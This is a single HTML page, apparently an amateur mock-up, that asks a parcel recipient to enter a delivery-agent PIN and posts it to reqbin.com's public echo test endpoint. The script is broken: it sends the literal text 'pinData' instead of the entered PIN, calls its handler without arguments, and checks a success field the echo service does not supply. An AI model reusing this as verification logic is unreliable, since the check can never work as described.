<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pin Verification</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
      }
    </style>
  </head>
  <body>
    <div
      style="
        height: 100vh;
        width: 100%;
        background-color: #333333;
        display: flex;
        justify-content: center;
        align-items: center;
      "
    >
      <div>
        <form action="" style="text-align: center; color: white">
          <h2 style="margin-bottom: 2rem">Confirm Pin</h2>
          <p>
            Please request PIN from from delivery agent in order for you to
            release parcel.
          </p>
          <div
            style="
              width: calc(350px - 20px);
              height: fit-content;
              background: white;
              border-radius: 10px;
              padding: 10px;
              max-width: 320px;
              margin: 2rem auto;
            "
          >
            <input
              placeholder="PIN"
              type="text"
              name=""
              id="pin"
              style="
                width: calc(100% - 20px);
                border: 0;
                background: #c9c9c9;
                padding: 10px;
                border-radius: 50px;
                font-size: 14px;
                margin: 0px auto 10px;
              "
            />
            <button
              style="
                width: 100%;
                padding: 10px;
                border: 0;
                margin: 5px auto 10px;
                border-radius: 50px;
                background: #ffe200;
                cursor: pointer;
              "
              id="pinBtn"
            >
              Confirm PIN
            </button>
          </div>
        </form>
      </div>
    </div>
    <script>
      const pinData = document.getElementById("pin");
      const btnSubmit = document.getElementById("pinBtn");

      const fireYourSelf = async (e, pinData) => {
        const response = await fetch("https://reqbin.com/echo/post/json", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: `{
                    "pin": pinData
                }`,
        });

        response.json().then((data) => {
          if (data.success) {
            alert("pin varified");
          } else {
            alert("incorrect pin");
          }
        });
      };

      btnSubmit.addEventListener("click", (e) => {
        e.preventDefault();
        fireYourSelf();
      });
    </script>
  </body>
</html>
